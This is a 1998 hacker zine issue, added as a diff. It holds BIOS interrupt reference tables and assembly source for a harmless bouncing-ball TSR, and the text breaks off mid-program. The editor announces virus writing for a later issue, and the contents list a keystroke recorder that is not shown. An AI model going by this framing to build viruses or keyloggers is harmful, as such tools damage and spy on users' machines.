@@ -1,0 +1,2142 @@
+HCF Magazine - Issue 002                                         January 1998
+
+
+                   +-------------------------------------+
+                   | H A L T   &   C A T C H   F I R E ! |
+                   +-------------------------------------+
+
+
+> Introduction <
+
+
+I've been pretty busy at school lately with finals and other worthless crap
+I've had to do, so this issue is coming out around mid-January instead of the
+beginning of Januray like I had planned.  Oh well.  I have an extended essay
+research project due in about a month, for which I'm going to have to write
+some computer virii.  These will probably appear in the next issue.  Computer
+virii are a lot of fun to play with, so I hope this will become a more common
+topic in future issues.
+If you have any questions, comments, suggestions, etc., or would like to
+publish an article you've written, send your e-mail to phasm42@hotmail.com; I
+usually check it every day.  If you're on ICQ, my number is 6509420.
+
+------------------------------------------------------------------------------
+
+Table of Contents
+-----------------
+
+
+BIOS Video Services Summary...............................................#001
+BIOS Disk Services Summary................................................#002
+Keyboard And Clock Services Summary.......................................#003
+Miscellaneous BIOS Services Summary.......................................#004
+Bouncing ball v19.........................................................#005
+Keystroke recorder v3.....................................................#006
+Phantom File TSR..........................................................#007
+Slow Writer...............................................................#008
+Some thoughts on background processing....................................#009
+
+------------------------------------------------------------------------------
+
+BIOS Video Services Summary                                               #001
+---------------------------
+
+
+> What is it? <
+
+This is a quick reference of the more commonly used BIOS video services
+provided through int 10h.  It is not very detailed, but for those readers that
+do not have a reference, this is a brief description of each service and how
+to call them.
+
+> Set Video Mode <                                              Int 10/00
+
+To call :       AH = 00
+                AL = video mode
+Returns :       Nothing
+
+Mode    Colors  Resolution      Grph Resolution
+------  ------  ----------      ---------------
+0 Text  16      40 x 25
+1 Text  16      40 x 25
+2 Text  16      80 x 25
+3 Text  16      80 x 25
+4 Grph  4       40 x 25         320 x 200
+5 Grph  4       40 x 25         320 x 200
+6 Grph  2       80 x 25         640 x 200
+7 Text  Mono    80 x 25
+D Grph  16      40 x 25         320 x 200
+E Grph  16      80 x 25         640 x 200
+F Grph  Mono    80 x 25         640 x 350
+10 Grph 16      80 x 25         640 x 350
+11 Grph 2       80 x 30         640 x 480
+12 Grph 16      80 x 30         640 x 480
+13 Grph 256     40 x 25         320 x 200
+
+> Set Cursor Type <                                             Int 10/01
+
+To call :       AH = 01
+                CH = Starting scan line (bits 0-4)
+                CL = Ending scan line (bits 0-4)
+Returns :       Nothing
+
+> Set Cursor Position <                                         Int 10/02
+
+To call :       AH = 02
+                BH = Page number (0 in graphics modes)
+                DH = Row (0 based)
+                DL = Column (0 based)
+Returns :       Nothing
+
+> Get Cursor Position and Type <                                Int 10/03
+
+To call :       AH = 03
+                BH = Page number (0 in graphics modes)
+Returns :       CH = Start scan line for cursor
+                CL = End scan line for cursor
+                DH = Row (0 based)
+                DL = Column (0 based)
+
+> Select Display Page <                                         Int 10/05
+
+To call :       AH = 05
+                AL = Page number
+Returns :       Nothing
+
+> Scroll Window Up/Down <                                       Int 10/06,07
+
+To call :       AH = 06 if up, 07 if down
+                AL = Number of lines to scroll
+                BH = Attribute to use for blanked area
+                CH = Row of upper left corner
+                CL = Column of upper left corner
+                DH = Row of lower right corner
+                DL = Column of lower right corner
+Returns :       Nothing
+
+Note : If AL = 0 or AL is greater than the size of the window, then the area
+will be blanked with the specified attribute.
+
+> Get Character and Attribute <                                 Int 10/08
+
+To call :       AH = 08
+                BH = Page number (0 in graphics modes)
+Returns :       AH = Attribute
+                AL = Character
+Note : Character read from cursor position on specified page.
+
+> Write Character and Attribute <                               Int 10/09
+
+To call :       AH = 09
+                AL = Character
+                BH = Page number (0 in graphics modes)
+                BL = Attribute for character
+                CX = Number of characters to write
+Returns :       Nothing
+
+Note : Does not change cursor position.
+
+> Write Character w/o Attribute <                               Int 10/0A
+
+To call :       AH = 0A
+                AL = Character
+                BH = Page number (0 in graphics modes)
+                BL = Color of character in graphics modes
+                CX = Number of characters to write
+Returns :       Nothing
+
+Note : Does not change cursor position.
+
+> Write Graphics Pixel <                                        Int 10/0C
+
+To call :       AH = 0C
+                AL = Color value
+                BH = Page number
+                CX = Pixel's X coordinate
+                DX = Pixel's Y coordinate
+
+Note : If bit 7 of AL is set, value is XORed onto screen (except in 256-color
+screen modes).
+
+> Read Graphics Pixel <                                         Int 10/0D
+
+To call :       AH = 0D
+                BH = Page number
+                CX = Pixel's X coordinate
+                DX = Pixel's Y coordinate
+Returns :       AL = Color of pixel
+
+> Teletype Output <                                             Int 10/0E
+
+To call :       AH = 0E
+                AL = Character
+                BH = Page number (0 in graphics modes)
+                BL = Color of character in graphics modes
+Returns :       Nothing
+
+Note : This function interprets the bell (07h), backspace (08h), line feed
+(0Ah), and carriage return (0Dh) characters.  Note that the tab (09h)
+character is NOT interpreted.
+
+> Get Current Display Mode <                                    Int 10/0F
+
+To call :       AH = 0F
+Returns :       AH = Number of columns on screen
+                AL = Display mode
+                BH = Active display page
+
+> Write String <                                                Int 10/13
+
+To call :       AH = 13
+                AL = Write mode
+                    Bit 0 : Update cursor after writing string
+                    Bit 1 : String composed of alternating characters and
+                            attributes
+                    Bits 2-7 : Reserved (0)
+                BH = Page number (0 in graphics modes)
+                BL = Color of character if bit 1 of AL not set
+                CX = Number of characters to write
+                DH = Row at which to start writing
+                DL = Column at which to start writing
+                ES:BP -> String to write
+
+------------------------------------------------------------------------------
+
+BIOS Disk Services Summary                                                #002
+--------------------------
+
+
+> What is it? <
+
+Duh.
+
+> Reset Disk System <                                           Int 13/00
+
+To call :       AH = 00
+                DL = Physical drive number (bit 7 set for hard disks)
+Returns :       AH = Status
+                Carry flag clear is successful (AH = 00)
+                Carry flag set is error
+
+Note : This service instructs the drive to pull the heads back to track 0.
+
+Status codes (applies to all int 13h calls)
+00 : Success
+01 : Invalid function in AH or invalid parameter
+02 : Address mark not found
+03 : Disk write-protected
+04 : Sector not found/Read error
+05 : Reset failed
+06 : Invalid disk change
+07 : Drive parameter activity failed
+08 : DMA overrun
+09 : DMA boundary error (attempted DMA transfer across 64K boundary)
+0C : Unsupported track or invalid media
+10 : CRC error on read
+20 : Controller failure
+40 : Seek failed
+80 : Timeout
+
+> Get Status Of Last Operation <                                Int 13/01
+
+To call :       AH = 01
+                DL = Physical drive number (bit 7 set for hard disks)
+Returns :       AH = Status (See table in Int 13/00)
+
+> Read From Disk/Write To Disk <                                Int 13/02,03
+
+To call :       AH = 02 for read, 03 for write
+                AL = Number of sectors
+                CH = Lower 8 bits of track number
+                CL = Bits 0-5 : Sector number (1 - 63)
+                     Bits 6-7 : Upper 2 bits of track number
+                DH = Head number
+                DL = Physical drive number (bit 7 set for hard disks)
+                ES:BX -> Buffer
+Returns :       AH = Status (See table in Int 13/00)
+                AL = Number of sectors transferred
+                Carry flag clear is successful
+                Carry flag set if error
+
+Notes : For some drives (especially floppy drives) transfers must not be done
+across 64K boundaries, and large transfers cannot cross head and track
+boundaries.  Transfers which require switching the head or track must be
+broken into a series of smaller transfers.
+
+> Verify Disk Sectors <                                         Int 13/04
+
+To call :       AH = 04
+                AL = Number of sectors
+                CH = Lower 8 bits of track number
+                CL = Bits 0-5 : Sector number (1 - 63)
+                     Bits 6-7 : Upper 2 bits of track number
+                DH = Head number
+                DL = Physical drive number (bit 7 set for hard disks)
+Returns :       AH = Status (See table in Int 13/00)
+                AL = Number of sectors transferred
+                Carry flag clear is successful
+                Carry flag set if error
+
+Notes : This service checks whether the CRC stored on the disk matches the
+actual CRC of the data read from the disk.  Verifies which require switching
+the head or track must be broken into a series of smaller verifies.
+
+> Format Floppy Disk Track <                                    Int 13/05
+
+To call :       AH = 05
+                AL = Number of sectors to create
+                CH = Track
+                DH = Head number
+                DL = Drive number (Table shown is for floppy drives only)
+                ES:BX -> Table of how to format each sector
+                    For every sector to be formatted,
+                    Byte 0 : Track number
+                    Byte 1 : Head number
+                    Byte 2 : Sector number
+                    Byte 3 : Sector size
+                        00 = 128 bytes
+                        01 = 256 bytes
+                        02 = 512 bytes
+                        03 = 1024 bytes
+Returns :       AH = Status (See table in Int 13/00)
+                Carry flag clear if successful
+                Carry flag set if error
+
+Note : The sectors/track value is taken from the diskette parameter table
+pointed to by int 1Eh.
+
+> Get Drive Parameters <                                        Int 13/08
+
+To call :       AH = 08
+                DL = Physical drive number (bit 7 set for hard disks)
+Returns :       Carry flag clear is successful
+                    AH = Status (00)
+                    BL = Drive type
+                        01 : 360K
+                        02 : 1.2M
+                        03 : 720K
+                        04 : 1.44M
+                    CH = Lower 8 bits of tracks
+                    CL = Bits 0-5 : Sectors/track
+                         Bits 6-7 : Upper 2 bits of tracks
+                    DH = Maximum head number
+                    DL = Number of drives
+                    ES:DI -> Drive parameter table (floppies only)
+                Carry flag set if error
+                    AH = Status (See table in Int 13/00)
+
+Drive Parameter Table.  Same format as table pointed to by int 1E.
+Offset  Contents
+------  --------
+00      First specify byte
+            Bits 7-4 : Step rate
+            Bits 3-0 : Head unload time (0F = 240 ms)
+01      Second specify byte
+            Bits 7-1 : Head load time (01 = 40 ms)
+            Bit 0 : Non-DMA mode (always 0)
+02      (BYTE) delay until motor turned off (in clock ticks)
+03      (BYTE) sector size
+            00 = 128 bytes
+            01 = 256 bytes
+            02 = 512 bytes
+            03 = 1024 bytes
+04      (BYTE) sectors/track
+05      (BYTE) gap length between sectors (2Ah for 5.25", 1Bh for 3.5")
+06      (BYTE) data length (ignored if sector size is nonzero)
+07      (BYTE) gap length when formatting (50h for 5.25", 6Ch for 3.5")
+08      (BYTE) format filler byte (default = F6h)
+09      (BYTE) head settle time in milliseconds
+0A      (BYTE) motor start time in 1/8 seconds
+
+> Initialize Hard Disk Using Table <                            Int 13/09
+
+To call :       AH = 09
+                DL = Physical drive number (hard disks only)
+Returns :       AH = Status (See table in Int 13/00)
+                Carry flag clear is successful
+                Carry flag set if error
+
+Note : If the physical drive is 80h, then the table is pointed at by int 41h.
+If the physical drive is 81h, then the table is pointed at by int 46h.
+
+> Hard Disk Seek to Cylinder <                                  Int 13/0C
+
+To call :       AH = 0C
+                CH = Lower 8 bits of track number
+                CL = Bits 0-5 : Sector number (1 - 63)
+                     Bits 6-7 : Upper 2 bits of track number
+                DH = Head number
+                DL = Physical drive number (hard drives only)
+Returns :       AH = Status (See table in Int 13/00)
+                Carry flag clear is successful
+                Carry flag set if error
+
+> Hard Disk Reset/Check if Ready/Recalibrate <                 Int 13/0D,10,11
+
+To call :       AH = 0D if resetting
+                     10 if checking if ready
+                     11 if recalibrating
+                DL = Physical drive number (hard drives only)
+Returns :       AH = Status (See table in Int 13/00)
+                Carry flag clear is successful
+                Carry flag set if error
+
+> Hard Disk Controller RAM/Drive/Internal Diagnostic <         Int 13/12,13,14
+
+To call :       AH = 12 if controller RAM diagnostics
+                     13 if drive diagnostics
+                     14 if internal controller diagnostics
+                DL = Physical drive number (hard drives only)
+Returns :       AH = Status (See table in Int 13/00)
+                AL = 00
+                Carry flag clear is successful
+                Carry flag set if error
+
+> Get Disk Type <                                               Int 13/15
+
+To call :       AH = 15
+                DL = Physical drive number (hard drives only)
+Returns :       Carry flag clear if successful
+                    AH = Type code
+                        00 : Drive does not exist
+                        01 : Floppy without change-line support
+                        02 : Floppy with change-line support
+                        03 : Hard disk
+                            CX:DX = DWORD number of sectors
+                Carry flag set if error
+                    AH = Status (See table in Int 13/00)
+
+> Detect Disk Change <                                          Int 13/16
+
+To call :       AH = 16
+                DL = Physical drive number (floppies only)
+Returns :       Carry flag clear if change line inactive
+                    AH = 00 (no disk change)
+                Carry flag set if change line active
+                    AH = Status
+                        01 : Invalid command
+                        06 : Change line active or unsupported
+                        80 : Drive not ready or non-existent
+
+> Set Floppy Disk Type For Formatting <                         Int 13/17
+
+To call :       AH = 17
+                AL = Type
+                    01 = 320K/360K disk in 360K drive
+                    02 = 320K/360K disk in 1.2M drive
+                    03 = 1.2M disk in 1.2M drive
+                    04 = 720K disk in 720K or 1.44M drive
+                DL = Physical drive number (floppies only)
+Returns :       AH = Status (See table in Int 13/00)
+                Carry flag clear if successful
+                Carry flag set if error
+
+> Set Media Type For Format <                                   Int 13/18
+
+To call :       AH = 18
+                CH = Lower 8 bits of maximum track number (total - 1)
+                CL = Bits 0-5 : Sectors/track (1 - 63)
+                     Bits 6-7 : Upper 2 bits of maximum track number
+                DH = Head number
+                DL = Physical drive number (bit 7 set for hard disks)
+Returns :       AH = Status (00, 01, 0C, 80; See table in Int 13/00)
+                ES:DI -> Diskette parameter table (See table in Int 13/18)
+
+------------------------------------------------------------------------------
+
+Keyboard And Clock Services Summary                                       #003
+-----------------------------------
+
+
+> Get Non-extended Keystroke <                                  Int 16/00
+
+To call :       AH = 00
+Returns :       AH = BIOS scan code
+                AL = Character (00 if special)
+
+Note : This function returns non-extended keys.
+
+> Check For Non-extended Keystroke <                            Int 16/01
+
+To call :       AH = 01
+Returns :       Zero flag clear is keystroke ready
+                    AH = BIOS scan code
+                    AL = Character (00 if special)
+                Zero flag set if no keystroke ready
+
+Note : Even though keystroke information is returned, the key is not removed
+from the keyboard buffer.
+
+> Get Non-extended Shift Flags <                                Int 16/02
+
+To call :       AH = 02
+Returns :       AL = Keyboard flags located at 0040:0017
+                    Bit 7 : Insert active
+                    Bit 6 : Caps Lock enabled
+                    Bit 5 : Num Lock enabled
+                    Bit 4 : Scroll Lock enabled
+                    Bit 3 : Alt key depressed
+                    Bit 2 : Ctrl key depressed
+                    Bit 1 : Left shift key depressed
+                    Bit 0 : Right shift key depressed
+
+Note : AH often destroyed upon return
+
+> Set Typematic Rate And Delay <                                Int 16/03
+
+To call :       AH = 03
+                AL = Subfunction (05)
+                BH = Delay
+                    0 = 1/4 second
+                    1 = 1/2 second
+                    2 = 3/4 second
+                    3 = 1 second
+                BL = Rate (00-1F; 00 = 30/sec, 0C = 10/sec, 1F = 2/sec)
+Returns :       Nothing
+
+Note : AH often destroyed upon return
+
+> Store Keystroke in Keyboard Buffer <                          Int 16/05
+
+To call :       AH = 05
+                CH = BIOS scan code
+                CL = Character
+Returns :       AL = Status; 00 if successful, 01 if buffer full
+
+Note : AH often destroyed upon return
+
+> Get Extended Keystroke <                                      Int 16/10
+
+To call :       AH = 10
+Returns :       AH = BIOS scan code
+                AL = Character (00 if special)
+
+> Check For Extended Keystroke <                                Int 16/11
+
+To call :       AH = 11
+Returns :       Zero flag clear is keystroke ready
+                    AH = BIOS scan code
+                    AL = Character (00 if special)
+                Zero flag set if no keystroke ready
+
+Note : Even though keystroke information is returned, the key is not removed
+from the keyboard buffer.
+
+> Get Extended Shift Flags <                                    Int 16/12
+
+To call :       AH = 12
+Returns :       AL = Keyboard flags located at 0040:0017
+                    Bit 7 : Insert active
+                    Bit 6 : Caps Lock enabled
+                    Bit 5 : Num Lock enabled
+                    Bit 4 : Scroll Lock enabled
+                    Bit 3 : Alt key depressed (either one)
+                    Bit 2 : Ctrl key depressed (either one)
+                    Bit 1 : Left shift key depressed
+                    Bit 0 : Right shift key depressed
+                AH = Keyboard flags located at 0040:0018
+                    Bit 7 : Insert key depressed
+                    Bit 6 : Caps Lock key depressed
+                    Bit 5 : Num Lock key depressed
+                    Bit 4 : Scroll Lock key depressed
+                    Bit 3 : Pause active
+                    Bit 2 : SysReq key depressed
+                    Bit 1 : Left Alt key depressed
+                    Bit 0 : Left Ctrl key depressed
+
+> Get 122-Key Keystroke <                                       Int 16/20
+
+To call :       AH = 20
+Returns :       AH = BIOS scan code
+                AL = Character (00 if special)
+> Check For 122-Key Keystroke <                                 Int 16/21
+
+To call :       AH = 21
+Returns :       Zero flag clear is keystroke ready
+                    AH = BIOS scan code
+                    AL = Character (00 if special)
+                Zero flag set if no keystroke ready
+
+Note : Even though keystroke information is returned, the key is not removed
+from the keyboard buffer.
+
+> Get 122-Key Shift Flags <                                     Int 16/22
+
+To call :       AH = 22
+Returns :       AL = Keyboard flags at 0040:0017 (See table in Int 16/12)
+                AH = Keyboard flags at 0040:0018 (See table in Int 16/12)
+
+> Get Timer Tick Count <                                        Int 1A/00
+
+To call :       AH = 00
+Returns :       CX:DX = DWORD timer tick count (1 tick =  0.05492544718697
+                        seconds; 18.20649719238 ticks/second.  This timer tick
+                        is based on a 1234DDh Hz timer, which is usually set
+                        to generate an interrupt every 65,536 cycles.)
+                AL = Midnight flag; nonzero if midnight has passed
+
+> Set Timer Tick Count <                                        Int 1A/01
+
+To call :       AH = 01
+                CX:DX = DWORD timer tick count (see Int 1A/00 for details)
+Returns :       Nothing
+
+Note : Midnight flag is reset by this function.
+
+> Get Real-Time Clock Time <                                    Int 1A/02
+
+To call :       AH = 02
+Returns :       BX = Number of days since January 1, 1980 (when time began...)
+                CH = Hours (BCD)
+                CL = Minutes (BCD)
+                DH = Seconds (BCD)
+                DL = 1/100 seconds
+
+> Set Real-Time Clock Time <                                    Int 1A/03
+
+To call :       AH = 03
+                CH = Hour (BCD)
+                CL = Minutes (BCD)
+                DH = Seconds (BCD)
+                DL = Daylight savings (00 = standard, 01 = daylight savings)
+Returns :       Nothing
+
+> Get Real-Time Clock Date <                                    Int 1A/04
+
+To call :       AH = 04
+Returns :       Carry flag clear if successful
+                    CH = Century (BCD)
+                    CL = Year (BCD)
+                    DH = Month (BCD)
+                    DL = Day (BCD)
+                Carry flag set if error
+
+> Set Real-Time Clock Date <                                    Int 1A/05
+
+To call :       AH = 05
+                CH = Century (BCD)
+                CL = Year (BCD)
+                DH = Month (BCD)
+                DL = Day (BCD)
+Returns :       Nothing
+
+------------------------------------------------------------------------------
+
+Miscellaneous BIOS Services Summary                                       #004
+-----------------------------------
+
+
+> Get Equipment List <                                          Int 11
+
+To call :       Nothing
+Returns :       AX = BIOS equipment list
+
+BIOS Equipment List WORD
+Bits    Contents
+-----   --------
+15-14   Number of parallel ports installed
+13-12   Unused
+11-9    Number of serial ports installed
+8       Unused
+7-6     Number of floppies installed - 1 (if bit 0 set; otherwise unused)
+5-4     Initial video mode
+            00 : EGA, VGA, or PGA
+            01 : 40x25 color
+            10 : 80x25 color
+            11 : 80x25 monochrome
+3       Unused
+2       Pointing device installed
+1       80x87 coprocessor installed
+0       Floppy disk drive(s) installed (number stored in bits 7-6)
+
+> Get Memory Size <                                             Int 12
+
+To call :       Nothing
+Returns :       AX = Number of kilobytes of contiguous memory starting from
+                     absolute address 00000h.  This is stored at 0040:0013.
+
+> Initialize COM Port <                                         Int 14/00
+
+To call :       AH = 00
+                AL = Initialization parameter
+                    Bits 7-5 = Baud rate
+                        000 : 110 baud
+                        001 : 150 baud
+                        010 : 300 baud
+                        011 : 600 baud
+                        100 : 1200 baud
+                        101 : 2400 baud
+                        110 : 4800 baud
+                        111 : 9600 baud
+                    Bits 4-3 = Parity
+                        00, 10 : None
+                        01 : Odd
+                        11 : Even
+                    Bit 2 : Stop bits (0 = 1 bit, 1 = 2 bits)
+                    Bits 1-0 : Data bits
+                        00 : 5 bits
+                        01 : 6 bits
+                        10 : 7 bits
+                        11 : 8 bits
+                DX = COM port number
+                    0 : COM1
+                    1 : COM2
+                    2 : COM3
+                    3 : COM4
+Returns :       AH = Port status
+                AL = Modem status
+
+Port Status
+Bit     Use
+---     ---
+7       Timeout
+6       Transmit shift register empty
+5       Transmit holding register empty
+4       Break detected
+3       Framing error
+2       Parity error
+1       Overrun error
+0       Receive data ready
+
+Modem status
+Bit     Use
+---     ---
+7       Carrier detect
+6       Ring indicator
+5       Data set ready
+4       Clear to send
+3       Change in carrier detect status
+2       Trailing edge of ring indicator
+1       Change in data set ready status
+0       Change in clear to send status
+
+> Write Character To COM Port <                                 Int 14/01
+
+To call :       AH = 01
+                AL = Character
+                DX = COM port
+                    0 : COM1
+                    1 : COM2
+                    2 : COM3
+                    3 : COM4
+Returns :       AH = Status; bit 7 indicates error
+                    Bit 7 clear : No error
+                    Bit 7 set : Error; bits 6-0 = Port status (See table in
+                                Int 14/00)
+
+Note : Port must be initialized before calling this service
+
+> Read Character From COM Port <                                Int 14/02
+
+To call :       AH = 02
+                DX = COM port
+                    0 : COM1
+                    1 : COM2
+                    2 : COM3
+                    3 : COM4
+Returns :       AH = Status; bit 7 indicates error
+                    Bit 7 clear : No error
+                        AL = Character
+                    Bit 7 set : Error; bits 6-0 = Port status (See table in
+                                Int 14/00)
+
+Note : Port must be initialized before calling this service
+
+> Get COM Port Status <                                         Int 14/03
+
+To call :       AH = 03
+                DX = COM port
+                    0 : COM1
+                    1 : COM2
+                    2 : COM3
+                    3 : COM4
+Returns :       AH = Port status (See table in Int 14/00)
+                AL = Modem status (See table in Int 14/00)
+
+> Extended Initialize COM Port <                                Int 14/04
+
+To call :       AH = 04
+                AL = Break setting
+                    00 : Break
+                    01 : No break
+                BH = Parity
+                    00 : No parity
+                    01 : Odd parity
+                    02 : Even parity
+                    03 : Stick parity odd
+                    04 : Stick parity even
+                BL = Number of stop bits
+                    00 : One stop bit
+                    01 : Two stop bits (1.5 if data length is 5 bits)
+                CH = Data length
+                    00 : 5 bits
+                    01 : 6 bits
+                    02 : 7 bits
+                    03 : 8 bits
+                CL = Transmission rate (bps)
+                    00 : 110 bps
+                    01 : 150 bps
+                    02 : 300 bps
+                    03 : 600 bps
+                    04 : 1200 bps
+                    05 : 2400 bps
+                    06 : 4800 bps
+                    07 : 9600 bps
+                    08 : 19200 bps
+                DX = COM port
+                    0 : COM1
+                    1 : COM2
+                    2 : COM3
+                    3 : COM4
+Returns :       AH = Port status (See table in Int 14/00)
+                AL = Modem status (See table in Int 14/00)
+
+> Write Character To Printer <                                  Int 17/00
+
+To call :       AH = 00
+                AL = Character
+                DX = Printer number (0 = LPT1, 1 = LPT2, 2 = LPT3)
+Returns :       AH = Printer status
+
+Printer status
+Bits    Use
+----    ---
+7       Not busy
+6       Acknowledge
+5       Out of paper
+4       Printer selected
+3       I/O error
+2, 1    Unused
+0       Timeout
+
+> Initialize Printer Port <                                     Int 17/01
+
+To call :       AH = 01
+                DX = Printer number (0 = LPT1, 1 = LPT2, 2 = LPT3)
+Returns :       AH = Printer status (See table in Int 17/00)
+
+> Get Printer Status <                                          Int 17/02
+
+To call :       AH = 02
+                DX = Printer number (0 = LPT1, 1 = LPT2, 2 = LPT3)
+Returns :       AH = Printer status (See table in Int 17/00)
+
+> Control-Break Handler Address <                               Int 1B
+
+This routine is called when the keyboard handler detects a Ctrl-Break.
+Normally, this vector points to a routine which sets the DOS Ctrl-C flag.
+
+> Timer Tick Handler <                                          Int 1C
+
+This routine is normally called by the hardware timer tick handler (Int 08).
+Programs that want to be called periodically usually hook this interrupt.
+
+------------------------------------------------------------------------------
+
+Bouncing ball v19                                                         #005
+-----------------
+
+
+> Version 19?! <
+
+This is one of the first TSRs (and assembly program, for that matter) that I
+wrote.  Of the versions I kept, this is version 19.  Whenever I write a new
+TSR engine, I attach it to this program to test it out.  This version writes
+directly to screen memory.  Version 18 uses BIOS functions, but it's slower.
+Version 17 is two bytes longer than this one.  While adding the comments for
+this program, I noticed that in the GetRand procedure, I had done a 'mov dx,
+cs' instead of a 'mov dx, cx'.  I went back, and noticed that I had made this
+same mistake since version 10.  Because it was used for random numbers, and
+not very often, the mistake escaped for a long time.  Anyway, here's the
+program:
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+.8086
+code    segment byte public
+        assume cs:code, ds:code
+        org     100h
+
+start:
+        jmp     initialize
+        nop
+        nop
+        tag db 'phasm 12/97'            ;My tag
+
+thedata:
+        textseg dw 0                    ;Segment for text video memory
+        coordinates     dw 0            ;Coordinates of the ball
+        vectors dw 0                    ;Direction of the ball
+        color   db 0                    ;Color of the ball
+        oldint  dw 0, 0                 ;Old int 1Ch vector
+
+tsr:
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    ds
+        push    es
+        push    cs
+        pop     ds
+        xor     ax, ax
+        mov     es, ax
+        mov     al, es:[449h]           ;Get the screen mode
+        cmp     al, 3
+        jbe     okaymode1               ;If 0-3, then okay mode
+        cmp     al, 7
+        je      okaymode2               ;If 7, then okay mode
+        jmp     exittsr                 ;Otherwise, abort
+
+okaymode1:
+        mov     [textseg], 0b800h       ;Modes 0-3 : Segment B800h
+        jmp     short continue1
+
+okaymode2:
+        mov     [textseg], 0b000h       ;Mode 7 : Segment B000h
+continue1:
+        mov     ax, es:[44eh]           ;Get the offset of the current page
+        shr     ax, 4                   ;Convert into a segment #
+        add     [textseg], ax           ;Add it to the video segment
+        mov     dl, es:[484h]           ;Maximum row number (rows - 1)
+        mov     dh, es:[44ah]           ;Columns on screen
+        push    dx                      ;Save
+        shr     dh, 1                   ;Divide columns by 2 (ball's columns)
+        dec     dh                      ;Decrement to find max
+        mov     bx, [coordinates]       ;Get coordinates of ball
+        mov     cx, [vectors]           ;Get ball's vector
+        or      cl, cl                  ;Is CL = 0?
+        jnz     down                    ;If not, goto down
+        dec     bl                      ;Decrement ball's row (move up)
+        cmp     bl, -1                  ;Is the row = -1?
+        jne     checkotherbound1        ;If not, check if out of bounds
+        mov     bl, 1                   ;Set row = 1
+        mov     cl, 1                   ;Set ball's direction to down
+checkotherbound1:
+        cmp     bl, dl
+        jbe     updatecolumn            ;If new row <= max row, check column
+        call    getnewstuff             ;Get new position and vector for ball
+        mov     bx, [coordinates]       ;Save coordinates
+        mov     cx, [vectors]           ;Save vectors
+        jmp     short updatedisplay     ;Update the display
+
+down:
+        inc     bl                      ;Increment ball's row (move down)
+        cmp     bl, dl                  ;Is the row <= last row?
+        jbe     updatecolumn            ;If so, go check the column
+        sub     bl, 2                   ;Bounce the ball
+        xor     cl, cl                  ;Set the vertical direction vector
+        cmp     bl, dl                  ;Is the row <= last row?
+        jbe     updatecolumn            ;If so, go check the column
+        call    getnewstuff             ;The # rows on screen has changed,
+                                        ;so new coordinates and vectors must
+                                        ;be generated
+        mov     bx, [coordinates]       ;Save the coordinates
+        mov     cx, [vectors]           ;Save the vectors
+        jmp     short updatedisplay     ;Update the display
+
+updatecolumn:
+        or      ch, ch                  ;Is horizontal vector = 0?
+        jnz     right                   ;If not, move right
+        dec     bh                      ;Decrement the column
+        cmp     bh, -1                  ;Is the column = -1
+        jne     checkotherbound2        ;If not, check the other bound
+        mov     bh, 1                   ;Set the column to 1
+        mov     ch, 1                   ;Bounce right
+checkotherbound2:
+        cmp     bh, dh                  ;Is the column <= max column?
+        jbe     updatedone              ;Is so, check if color needs to change
+        call    getnewstuff             ;Get new data for ball
+        mov     bx, [coordinates]       ;Save coordinates
+        mov     cx, [vectors]           ;Save vectors
+        jmp     short updatedisplay     ;Update the display
+
+right:
+        inc     bh                      ;Increment the column
+        cmp     bh, dh                  ;Is the column <= max column?
+        jbe     updatedone              ;If so, check if color needs to change
+        sub     bh, 2                   ;Update ball's position
+        xor     ch, ch                  ;Reverse direction (left)
+        cmp     bh, dh                  ;Is the column <= max column?
+        jbe     updatedone              ;If so, check if color needs to change
+        call    getnewstuff             ;Get new ball data
+        mov     bx, [coordinates]       ;Save coordinates
+        mov     cx, [vectors]           ;Save vectors
+        jmp     short updatedisplay     ;Update the display
+
+updatedone:
+        push    bx
+        cmp     cx, [vectors]           ;Does the ball have the same vectors?
+        je      preupdatedisplay        ;If yes, then update the display
+        mov     bx, 0fh
+        call    GetRand                 ;Get random number 0-14
+        inc     dl                      ;Shift range to 1-15
+        mov     [color], dl             ;Save new color
+preupdatedisplay:
+        pop     bx
+updatedisplay:
+        mov     ax, [textseg]
+        mov     es, ax                  ;Set ES to segment of video memory
+        pop     dx                      ;Restore screen's # columns
+        push    bx                      ;Save new ball coordinates
+        mov     ax, [coordinates]       ;Get old coordinates
+        mul     dh                      ;Get offset in chars to ball's old row
+        mov     bx, ax
+        mov     ax, [coordinates]
+        mov     al, ah
+        xor     ah, ah
+        shl     ax, 1                   ;Get offset in chars to ball's old col
+        add     bx, ax                  ;Get offset in chars to old ball
+        shl     bx, 1                   ;Translate into address
+        mov     word ptr es:[bx], 720h  ;Overwrite with space
+        mov     word ptr es:[bx + 2], 720h
+        pop     bx                      ;Restore new coordinates
+        mov     [coordinates], bx       ;Save new coordinates
+        mov     [vectors], cx           ;Save new vectors
+        mov     cl, bh                  ;Get column
+        xor     ch, ch
+        shl     cx, 1                   ;Translate into characters
+        mov     al, bl
+        mul     dh                      ;Translate row into characters
+        mov     bx, ax
+        add     bx, cx                  ;Get offset in characters to new ball
+        shl     bx, 1                   ;Translate into address
+        mov     ah, [color]             ;Get ball color
+        mov     al, 0dbh                ;Solid character
+        mov     es:[bx], ax             ;Display
+        mov     es:[bx + 2], ax
+exittsr:
+        pop     es
+        pop     ds
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        jmp     dword ptr cs:[oldint]   ;Outta here!
+
+getnewstuff     proc near
+        mov     bl, es:[484h]
+        xor     bh, bh                  ;Number of rows
+        inc     bl
+        call    GetRand                 ;Get random number 0-24
+        push    dx                      ;Store number
+        mov     bx, es:[44ah]
+        shr     bx, 1                   ;Number of columns
+        call    GetRand                 ;Get random number 0-39
+        push    dx                      ;Store number
+        mov     bx, 2                   ;Direction
+        call    GetRand                 ;Get random number 0-1
+        push    dx                      ;Store number
+        call    GetRand                 ;Get another
+        mov     cl, dl                  ;Column direction flag
+        pop     dx                      ;Restore number
+        mov     ch, dl                  ;Row direction flag
+        pop     dx                      ;Restore number
+        mov     bh, dl                  ;Column number
+        pop     dx
+        mov     bl, dl                  ;Row number
+        mov     [coordinates], bx
+        mov     [vectors], cx
+        mov     bx, 0fh
+        call    GetRand
+        inc     dl
+        mov     [color], dl
+getnewstuff     endp
+
+GetRand PROC NEAR
+        push    ax
+        push    cx
+        xor     ah, ah                  ;Set function 0
+        int     1ah                     ;Get number of ticks
+        mov     ax, dx
+        mov     dx, cx
+        xor     ax, dx
+        xor     dx, dx
+        div     bx                      ;Divide
+        pop     cx
+        pop     ax
+        retn
+GetRand ENDP
+
+initialize:
+        push    es
+        xor     ax, ax
+        mov     es, ax
+        call    getnewstuff
